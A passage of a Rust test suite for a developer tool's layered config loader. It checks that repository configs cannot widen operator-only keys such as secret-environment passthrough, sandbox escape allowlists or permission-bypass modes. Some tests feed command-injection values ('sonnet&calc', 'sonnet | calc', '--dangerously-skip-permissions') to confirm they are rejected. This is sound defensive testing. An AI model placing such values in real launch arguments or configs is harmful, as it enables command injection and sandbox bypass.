        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let empty = env_map(&[]);
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a repo may not widen its own pane's workdir roots")
            .to_string();
        assert!(err.contains("dash.workdir_roots"), "got {err}");
        assert!(
            err.contains("ZIRV_CTX_DASH_WORKDIR_ROOTS"),
            "names the operator escape hatch: {err}"
        );
    }

    /// Issue #233: `workflow.check_env_passthrough` is operator-only, the
    /// identical widening-only asymmetry `repo_layer_cannot_add_sandbox_
    /// extra_allow_entries` above pins for `sandbox.extra_allow` -- a repo
    /// checkout naming a variable here would let its own `verify.toml`
    /// checks read it out of the operator's process environment.
    /// Issue #406: `hooks.reuse_exclude` is empty by default -- the whole
    /// checkout is in the reuse probe's scope until someone narrows it --
    /// and a REPO layer may narrow it, unlike every operator-only key below.
    #[test]
    fn a_repo_layer_may_set_hooks_reuse_exclude() {
        assert!(
            CtxConfig::default().hooks.reuse_exclude.is_empty(),
            "the default must probe the whole checkout"
        );
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[hooks]\nreuse_exclude = [\"src/generated\"]\n",
        )
        .expect("write");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect("a repo may narrow the reuse probe's own scope");
        assert_eq!(cfg.hooks.reuse_exclude, vec!["src/generated".to_string()]);
    }

    /// Issue #233: `workflow.check_env_passthrough` is operator-only, the
    /// identical widening-only asymmetry `repo_layer_cannot_add_sandbox_
    /// extra_allow_entries` above pins for `sandbox.extra_allow` -- a repo
    /// checkout naming a variable here would let its own `verify.toml`
    /// checks read it out of the operator's process environment.
    #[test]
    fn repo_layer_cannot_set_workflow_check_env_passthrough() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[workflow]\ncheck_env_passthrough = [\"AWS_SECRET_ACCESS_KEY\"]\n",
        )
        .expect("write");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let empty = env_map(&[]);
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a repo may not widen the check-env passthrough allowlist")
            .to_string();
        assert!(err.contains("workflow.check_env_passthrough"), "got {err}");
        assert!(
            err.contains("ZIRV_CTX_WORKFLOW_CHECK_ENV_PASSTHROUGH"),
            "names the operator escape hatch: {err}"
        );
    }

    /// Issue #235: `workflow.review_worker_budget_tokens`/
    /// `review_worker_max_tool_calls` are operator-only, same asymmetry as
    /// `check_env_passthrough` above.
    #[test]
    fn repo_layer_cannot_set_workflow_review_worker_budget_keys() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[workflow]\nreview_worker_budget_tokens = 999999\n",
        )
        .expect("write");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let empty = env_map(&[]);
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a repo may not set its own reviewer worker token budget")
            .to_string();
        assert!(
            err.contains("workflow.review_worker_budget_tokens"),
            "got {err}"
        );
        assert!(
            err.contains("ZIRV_CTX_WORKFLOW_REVIEW_WORKER_BUDGET_TOKENS"),
            "names the operator escape hatch: {err}"
        );

        let repo2 = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo2.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo2.path().join(".zirv/ctx.toml"),
            "[workflow]\nreview_worker_max_tool_calls = 999\n",
        )
        .expect("write");
        let err2 = CtxConfig::load(repo2.path(), &|k| empty.get(k).cloned())
            .expect_err("a repo may not set its own reviewer worker tool-call ceiling")
            .to_string();
        assert!(
            err2.contains("workflow.review_worker_max_tool_calls"),
            "got {err2}"
        );
        assert!(
            err2.contains("ZIRV_CTX_WORKFLOW_REVIEW_WORKER_MAX_TOOL_CALLS"),
            "names the operator escape hatch: {err2}"
        );
    }

    /// Issue #242: `workflow.auto_spawn_on_gate` is operator-only, same
    /// asymmetry as `check_env_passthrough` above.
    #[test]
    fn repo_layer_cannot_set_workflow_auto_spawn_on_gate() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[workflow]\nauto_spawn_on_gate = true\n",
        )
        .expect("write");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let empty = env_map(&[]);
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a repo may not turn on its own auto-spawn")
            .to_string();
        assert!(err.contains("workflow.auto_spawn_on_gate"), "got {err}");
        assert!(
            err.contains("ZIRV_CTX_WORKFLOW_AUTO_SPAWN_ON_GATE"),
            "names the operator escape hatch: {err}"
        );
    }

    /// Issue #491: the whole `[runtime]` table is operator-only, in BOTH
    /// directions -- a checkout must not be able to move this operator's
    /// unflagged sessions onto their metered native routes, and "run on the
    /// harness instead" is not a safety property a checkout gets to assert
    /// either, because the harness account is just as spendable. Both the
    /// table-level `default` and a per-role entry are refused, by the
    /// table's own name -- a whole-table entry matches on the prefix, so the
    /// refusal says `runtime`, the same way `capabilities` does.
    #[test]
    fn repo_layer_cannot_set_runtime_default_or_roles() {
        for (case, toml) in [
            ("default", "[runtime]\ndefault = \"native\"\n"),
            ("roles", "[runtime.roles]\nworker = \"native\"\n"),
            ("prompt_cache_ttl", "[runtime]\nprompt_cache_ttl = \"1h\"\n"),
        ] {
            let repo = tempfile::tempdir().expect("tempdir");
            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
            std::fs::write(repo.path().join(".zirv/ctx.toml"), toml).expect("write");
            let home = tempfile::tempdir().expect("tempdir");
            let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
            let empty = env_map(&[]);
            let err = match CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()) {
                Err(err) => err.to_string(),
                Ok(_) => panic!("a repo may not set runtime.{case}"),
            };
            assert!(err.contains("`runtime`"), "runtime.{case}: got {err}");
            assert!(
                err.contains("ZIRV_CTX_RUNTIME"),
                "runtime.{case} names the operator escape hatch: {err}"
            );
        }
    }

    /// The other half of the same rule: the operator's own layer still sets
    /// it, which is the whole point of the key -- only the checkout is
    /// refused.
    #[test]
    fn the_operator_may_set_the_native_prompt_cache_ttl_from_env_and_bad_values_fail() {
        let repo = tempfile::tempdir().expect("tempdir");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let env = env_map(&[("ZIRV_CTX_RUNTIME_PROMPT_CACHE_TTL", "1h")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.runtime.prompt_cache_ttl.as_deref(), Some("1h"));
        let env = env_map(&[("ZIRV_CTX_RUNTIME_PROMPT_CACHE_TTL", "30m")]);
        let err = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect_err("bad ttl");
        assert!(
            err.to_string().contains("runtime.prompt_cache_ttl"),
            "got {err}"
        );
    }

    #[test]
    fn the_operator_may_set_a_native_runtime_default_from_home_config() {
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[runtime]\ndefault = \"native\"\n[runtime.roles]\nworker = \"harness\"\n",
        )
        .expect("write");
        let repo = tempfile::tempdir().expect("tempdir");
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.runtime.default.as_deref(), Some("native"));
        assert_eq!(
            cfg.runtime.roles.get("worker").map(String::as_str),
            Some("harness")
        );
    }

    /// Issue #268: `workflow.allow_empty_verify` is operator-only, same
    /// asymmetry as `auto_spawn_on_gate` above -- a repo checkout must not
    /// be able to declare its own missing/empty `verify.toml` a pass.
    #[test]
    fn repo_layer_cannot_set_workflow_allow_empty_verify() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[workflow]\nallow_empty_verify = true\n",
        )
        .expect("write");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let empty = env_map(&[]);
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a repo may not declare its own empty verify.toml a pass")
            .to_string();
        assert!(err.contains("workflow.allow_empty_verify"), "got {err}");
        assert!(
            err.contains("ZIRV_CTX_WORKFLOW_ALLOW_EMPTY_VERIFY"),
            "names the operator escape hatch: {err}"
        );
    }

    /// The operator's home layer and `ZIRV_CTX_*` env override still work,
    /// same as `auto_spawn_on_gate`.
    #[test]
    fn the_operator_may_set_workflow_allow_empty_verify_from_home_config_and_env() {
        let home = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[workflow]\nallow_empty_verify = true\n",
        )
        .expect("write");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("tempdir");
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert!(cfg.workflow.allow_empty_verify);

        let env = env_map(&[("ZIRV_CTX_WORKFLOW_ALLOW_EMPTY_VERIFY", "false")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert!(!cfg.workflow.allow_empty_verify);
    }

    /// The operator's home layer and `ZIRV_CTX_*` env override still work,
    /// same as `check_env_passthrough`.
    #[test]
    fn the_operator_may_set_workflow_review_worker_budget_from_home_config_and_env() {
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[workflow]\nreview_worker_budget_tokens = 75000\nreview_worker_max_tool_calls = 30\n",
        )
        .expect("write");
        let repo = tempfile::tempdir().expect("tempdir");
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect("the operator's home layer may set these keys");
        assert_eq!(cfg.workflow.review_worker_budget_tokens, Some(75_000));
        assert_eq!(cfg.workflow.review_worker_max_tool_calls, Some(30));

        let overridden = env_map(&[
            ("ZIRV_CTX_WORKFLOW_REVIEW_WORKER_BUDGET_TOKENS", "120000"),
            ("ZIRV_CTX_WORKFLOW_REVIEW_WORKER_MAX_TOOL_CALLS", "10"),
        ]);
        let cfg = CtxConfig::load(repo.path(), &|k| overridden.get(k).cloned())
            .expect("the operator's env may override the home layer");
        assert_eq!(cfg.workflow.review_worker_budget_tokens, Some(120_000));
        assert_eq!(cfg.workflow.review_worker_max_tool_calls, Some(10));
    }

    /// The operator's own `~/.zirv/ctx.toml` may set
    /// `workflow.check_env_passthrough` (only `REPO_FORBIDDEN` blocks the
    /// repo layer, never the home layer), and
    /// `ZIRV_CTX_WORKFLOW_CHECK_ENV_PASSTHROUGH` overrides it from the
    /// environment -- the same operator-in-both-directions shape
    /// `the_operator_may_set_sandbox_extra_allow_and_deny_from_the_
    /// environment` pins for `sandbox.extra_allow`.
    #[test]
    fn the_operator_may_set_workflow_check_env_passthrough_from_home_config_and_env() {
        let home = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[workflow]\ncheck_env_passthrough = [\"CORP_PROXY_TOKEN\"]\n",
        )
        .expect("write");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("tempdir");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(
            cfg.workflow.check_env_passthrough,
            vec!["CORP_PROXY_TOKEN".to_string()],
            "the operator's own home-layer entry must survive"
        );

        let env = env_map(&[(
            "ZIRV_CTX_WORKFLOW_CHECK_ENV_PASSTHROUGH",
            "MY_VAR_A, MY_VAR_B",
        )]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(
            cfg.workflow.check_env_passthrough,
            vec!["MY_VAR_A".to_string(), "MY_VAR_B".to_string()],
            "the env value replaces the file-layer value outright"
        );
    }

    /// Issue #147: `safety.escape_allow` is operator-only, the identical
    /// asymmetry `repo_layer_cannot_add_sandbox_extra_allow_entries` above
    /// pins for `sandbox.extra_allow` -- a repo checkout adding to it would
    /// clear a family for its own `--dangerously-disable-sandbox` retries.
    #[test]
    fn repo_layer_cannot_add_safety_escape_allow_entries() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[safety]\nescape_allow = [\"curl *\"]\n",
        )
        .expect("write");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let empty = env_map(&[]);
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a repo may not widen the escape-allow list")
            .to_string();
        assert!(err.contains("safety.escape_allow"), "got {err}");
        assert!(
            err.contains("ZIRV_CTX_SAFETY_ESCAPE_ALLOW"),
            "names the operator escape hatch: {err}"
        );
    }

    /// The one list a repo checkout *may* contribute to: adding a deny entry
    /// only ever narrows. The union must include both layers' entries, end
    /// to end through `CtxConfig::load` -- a plain deep merge would let the
    /// repo's array silently replace the operator's instead.
    #[test]
    fn sandbox_extra_deny_unions_the_operators_and_the_repos_own_entries() {
        let home = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[sandbox]\nextra_deny = [\"Bash(npm publish *)\"]\n",
        )
        .expect("write");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[sandbox]\nextra_deny = [\"Bash(docker push *)\"]\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert!(
            cfg.sandbox
                .extra_deny
                .contains(&"Bash(npm publish *)".to_string()),
            "the operator's own entry must survive: {:?}",
            cfg.sandbox.extra_deny
        );
        assert!(
            cfg.sandbox
                .extra_deny
                .contains(&"Bash(docker push *)".to_string()),
            "the repo's own addition must land too: {:?}",
            cfg.sandbox.extra_deny
        );
    }

    /// The environment is the operator in both directions, exactly like
    /// `[policy]`'s own env layer: it replaces the unioned file value
    /// outright, for both extra lists.
    #[test]
    fn the_operator_may_set_sandbox_extra_allow_and_deny_from_the_environment() {
        let home = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[sandbox]\nextra_deny = [\"Bash(npm publish *)\"]\n",
        )
        .expect("write");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[
            (
                "ZIRV_CTX_SANDBOX_EXTRA_ALLOW",
                "Bash(just test *), Bash(just build *)",
            ),
            ("ZIRV_CTX_SANDBOX_EXTRA_DENY", "Bash(terraform apply *)"),
        ]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(
            cfg.sandbox.extra_allow,
            vec![
                "Bash(just test *)".to_string(),
                "Bash(just build *)".to_string()
            ]
        );
        assert_eq!(
            cfg.sandbox.extra_deny,
            vec!["Bash(terraform apply *)".to_string()],
            "the env value replaces the file-layer union outright"
        );
    }

    /// Same operator-final-word shape as `sandbox.extra_allow`'s own env
    /// override, pinned separately for `dash.workdir_roots` since it has no
    /// union counterpart to fold with (the key is `REPO_FORBIDDEN` outright,
    /// so only the operator's own home layer or this env var ever populate
    /// it -- there is nothing for a repo layer to contribute).
    #[test]
    fn the_operator_may_widen_dash_workdir_roots_from_the_environment() {
        let home = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[dash]\nworkdir_roots = [\"/from/home/layer\"]\n",
        )
        .expect("write");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[(
            "ZIRV_CTX_DASH_WORKDIR_ROOTS",
            "/from/env/one, /from/env/two",
        )]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(
            cfg.dash.workdir_roots,
            vec!["/from/env/one".to_string(), "/from/env/two".to_string()],
            "the env value replaces the home-layer value outright"
        );
    }

    #[test]
    fn env_can_disable_the_dashboard() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_DASH", "false")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert!(!cfg.dash.enabled);
    }

    #[test]
    fn the_operator_may_still_set_dash_keys() {
        let home_only = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home_only.path());
        let env = env_map(&[
            ("ZIRV_CTX_DASH", "false"),
            ("ZIRV_CTX_DASH_SIDEBAR_COLS", "30"),
            ("ZIRV_CTX_DASH_ROSTER_MAX_AGE_SECS", "60"),
            ("ZIRV_CTX_DASH_MAX_PANES", "3"),
            ("ZIRV_CTX_DASH_MOUSE", "false"),
        ]);
        let cfg = CtxConfig::load(home_only.path(), &|k| env.get(k).cloned()).expect("load");
        assert!(!cfg.dash.enabled, "the environment is the operator");
        assert_eq!(cfg.dash.sidebar_cols, 30);
        assert_eq!(cfg.dash.roster_max_age_secs, 60);
        assert_eq!(cfg.dash.max_panes, 3);
        assert!(
            !cfg.dash.mouse,
            "an operator who wants native text selection back turns capture off"
        );
    }

    /// Unlike `handoff.model`/`optimize.model`, `chat.model` shapes an
    /// interactive session the operator deliberately launched and the choice
    /// is displayed on screen -- see `ChatConfig`'s own doc comment and the
    /// spec's "Orchestrator model" section
    /// (docs/superpowers/specs/2026-08-13-zirv-dashboard-design.md). A repo
    /// checkout is therefore allowed to set it, unlike every other model key
    /// in `REPO_FORBIDDEN`.
    #[test]
    fn a_repository_config_may_set_the_chat_model() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[chat]\nmodel = \"opus\"\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.chat.model.as_deref(), Some("opus"));
    }

    #[test]
    fn env_overrides_the_chat_model() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_CHAT_MODEL", "sonnet")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.chat.model.as_deref(), Some("sonnet"));
    }

    /// Issue #504: the operator's own `~/.zirv/ctx.toml` may set
    /// `chat.claude_permission_mode` (unlike a repo layer -- see the
    /// `REPO_FORBIDDEN` test right below), and an unrecognized value is a
    /// load-time error rather than a value that reaches argv unexamined.
    #[test]
    fn chat_claude_permission_mode_parses_and_validates_the_fixed_set() {
        let home = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        // Separate from `home`: the operator and repo layers must not
        // collapse onto the same file, or the REPO_FORBIDDEN check below
        // would reject this operator-only value too.
        let repo = tempfile::tempdir().expect("tempdir");
        let empty = env_map(&[]);

        for mode in ["default", "acceptEdits", "bypassPermissions"] {
            std::fs::write(
                home.path().join(".zirv/ctx.toml"),
                format!("[chat]\nclaude_permission_mode = \"{mode}\"\n"),
            )
            .expect("write");
            let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
            assert_eq!(cfg.chat.claude_permission_mode.as_deref(), Some(mode));
        }

        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[chat]\nclaude_permission_mode = \"askForever\"\n",
        )
        .expect("write");
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("an unrecognized permission mode must fail to load");
        assert!(
            err.to_string().contains("chat.claude_permission_mode"),
            "got {err}"
        );
    }

    /// Issue #504: `ZIRV_CTX_CHAT_CLAUDE_PERMISSION_MODE` follows the same
    /// env-override pattern as every other operator-only `[chat]`/`REPO_
    /// FORBIDDEN` key (`ZIRV_CTX_CHAT_MODEL` right above).
    #[test]
    fn env_overrides_the_chat_claude_permission_mode() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_CHAT_CLAUDE_PERMISSION_MODE", "acceptEdits")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(
            cfg.chat.claude_permission_mode.as_deref(),
            Some("acceptEdits")
        );
    }

    /// Issue #504: unlike `chat.model` right above -- which a repo checkout
    /// MAY set (see `a_repository_config_may_set_the_chat_model`'s own doc
    /// comment) -- `chat.claude_permission_mode` widens what a session may
    /// silently DO, so a repo layer setting it at all is a hard load error,
    /// not merely a rejected value.
    #[test]
    fn a_repo_may_not_set_the_chat_claude_permission_mode() {
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[chat]\nclaude_permission_mode = \"bypassPermissions\"\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a repository must not be able to set chat.claude_permission_mode");
        assert!(
            is_repo_forbidden(err.as_ref()),
            "chat.claude_permission_mode must be rejected as REPO_FORBIDDEN: {err}"
        );
    }

    /// SECURITY (FIX 1): `chat.model` is repo-settable and reaches an argv that
    /// `resolve_program` may route through `cmd.exe /c` on Windows, so a repo
    /// value bearing a shell/cmd metacharacter must fail the load rather than
    /// carry a command-injection payload into the launch.
    #[test]
    fn a_repo_chat_model_with_a_shell_metacharacter_is_rejected() {
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[chat]\nmodel = \"sonnet&calc\"\n",
        )
        .expect("write");
        let empty = env_map(&[]);
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a metacharacter model must fail the load");
        assert!(
            err.to_string().contains("chat.model"),
            "the refusal names the key: {err}"
        );
    }

    /// FIX 1: real model ids -- a Bedrock id with `:` `/` `.`, a Vertex id with
    /// `@`, a hyphenated alias, a bare name -- use only the allowed charset and
    /// load cleanly, so the exemption's disclosed operator-in-repo purpose
    /// survives the guard.
    #[test]
    fn real_model_ids_are_accepted() {
        for model in [
            "us.anthropic.claude-sonnet-4-v1:0",
            "claude-fable-5",
            "fable",
            "claude-sonnet-4@20250101",
        ] {
            let home = tempfile::tempdir().expect("tempdir");
            let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
            let repo = tempfile::tempdir().expect("tempdir");
            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
            std::fs::write(
                repo.path().join(".zirv/ctx.toml"),
                format!("[chat]\nmodel = \"{model}\"\n"),
            )
            .expect("write");
            let empty = env_map(&[]);
            let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
                .unwrap_or_else(|e| panic!("'{model}' should load: {e}"));
            assert_eq!(cfg.chat.model.as_deref(), Some(model));
        }
    }

    /// SECURITY: a leading-dash model value would reach the launch argv as its
    /// own flag (`--model --dangerously-skip-permissions`), so it is rejected at
    /// load, while an ordinary hyphenated id (`claude-opus-5`) that only uses a
    /// hyphen mid-token still loads cleanly.
    #[test]
    fn a_leading_dash_chat_model_is_rejected() {
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_CHAT_MODEL", "--dangerously-skip-permissions")]);
        let err = CtxConfig::load(repo.path(), &|k| env.get(k).cloned())
            .expect_err("a leading-dash model must fail the load");
        assert!(err.to_string().contains("chat.model"), "got {err}");

        for good in ["fable", "claude-opus-5"] {
            let env = env_map(&[("ZIRV_CTX_CHAT_MODEL", good)]);
            let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned())
                .unwrap_or_else(|e| panic!("'{good}' should load: {e}"));
            assert_eq!(cfg.chat.model.as_deref(), Some(good));
        }
    }

    /// FIX 1: the `ZIRV_CTX_CHAT_MODEL` env path merges before the same
    /// validation, so an operator-set metacharacter is rejected identically --
    /// the check is on the merged value, not on which layer set it.
    #[test]
    fn the_env_chat_model_path_is_validated_identically() {
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_CHAT_MODEL", "sonnet | calc")]);
        let err = CtxConfig::load(repo.path(), &|k| env.get(k).cloned())
            .expect_err("an env metacharacter model must fail too");
        assert!(err.to_string().contains("chat.model"), "got {err}");
    }

    /// FIX 1: an over-long model string is rejected before it can reach any
    /// argv, bounding the value regardless of its charset.
    #[test]
    fn an_overlong_chat_model_is_rejected() {
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("tempdir");
        let long = "a".repeat(129);
        let env = env_map(&[("ZIRV_CTX_CHAT_MODEL", long.as_str())]);
        let err = CtxConfig::load(repo.path(), &|k| env.get(k).cloned())
            .expect_err("a 129-char model must fail");
        assert!(err.to_string().contains("chat.model"), "got {err}");
    }

    #[test]
    fn the_agent_gate_is_loaded_alongside_the_ctx_config() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/.settings.toml"),
            "[agents.codex]\nenabled = false\n",
        )
        .expect("write");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert!(!cfg.agents.is_enabled("codex"));
        assert!(cfg.agents.is_enabled("claude"));
    }

    #[test]
    fn repo_deploy_minimum_can_only_raise_operator_tier() {
        use crate::commands::workflow::deploy::DeployTier;

        let home = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[workflow.deploy]\ntier = \"staging\"\nminimum_tier = \"development\"\n",
        )
        .expect("home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[workflow.deploy]\nminimum_tier = \"production\"\n",
        )
        .expect("repo");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|key| empty.get(key).cloned()).expect("load");
        assert_eq!(cfg.workflow.deploy.tier, DeployTier::Production);
        assert_eq!(
            cfg.workflow.deploy.minimum_tier,
            Some(DeployTier::Production)
        );
    }

    #[test]
    fn repo_deploy_minimum_cannot_lower_operator_tier() {
        use crate::commands::workflow::deploy::DeployTier;

        let home = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[workflow.deploy]\ntier = \"production\"\n",
        )
        .expect("home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[workflow.deploy]\nminimum_tier = \"development\"\n",
        )
